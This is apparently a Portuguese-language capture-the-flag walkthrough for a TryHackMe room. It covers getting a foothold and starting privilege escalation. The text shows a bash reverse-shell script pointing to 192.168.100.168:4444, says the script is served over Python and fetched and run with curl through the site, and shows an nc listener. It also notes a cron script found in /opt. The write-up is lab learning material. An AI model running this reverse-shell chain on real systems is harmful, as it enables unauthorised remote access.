# 🛡️ Exploração da Máquina — 0ff3ns!v3 S3cur!ty - Sw4gg3r

## 🔗 Links

- 💻 **Máquina:** [Google Drive - Máquina](https://drive.google.com/file/d/1XsuWUulDDdktnV6fpPgRIH172iASvVmz/view)
- 🔍 **Prova:** [TryHackMe - 0ff3ns!v3 S3cur!ty - Sw4gg3r](https://tryhackme.com/room/0ff3nsv3s3curtysw4gg3r)

---
## obs: Desligar antivirus.

### Parece que a mquina tem um curl ,da pra subir um arquivo shell em servidor python com o script do shelRev baixar na maquina com o curl , executar e escutar a resposta do outro lado

![image](https://github.com/user-attachments/assets/9de29dba-6b94-4492-9d84-54b28b5408e3)
### dentro do arquivo shell_2.sh

```shell
  #!/bin/bash
  bash -i >& /dev/tcp/192.168.100.168/4444 0>&1

```

### Dentro dessa pasta vamos subir o servidor pyhton para baixar com o curl
![image](https://github.com/user-attachments/assets/ce117679-c08a-4e7b-90c8-79057e4d97db)

---

### No site vamos colocar o comando do curl para baixar o arquivo e em seguida ja executa-lo | shel_2
![image](https://github.com/user-attachments/assets/c0bba9e9-88df-4021-b2c9-9c3276935111)

### no outro terminal eu fico na escuta do nc -nlvp 4444
![image](https://github.com/user-attachments/assets/c3e6ad67-6e91-4442-a4e9-6196b32a58e2)

### shel recebido agora fazer post exploration e escalar previlegio
## acesso a maquina pelo www/data
![image](https://github.com/user-attachments/assets/a200a374-0976-4250-b338-69ea9889edbb)

---

# aqui estao todos os arquivos que foi feito o fuzzing ,Agora fazer um exploração pelos arquivos em busca de algo interessante
# dentro dessa pasta opt achei um .sh que funciona a cada 1 via cron
![image](https://github.com/user-attachments/assets/854a11c4-a51e-4e55-85b3-e3faf37ec0c1)
### entendendo oque ocorre no script
![image](https://github.com/user-attachments/assets/a5f88153-c1f1-40fa-88f6-4e6f5c855d4d)



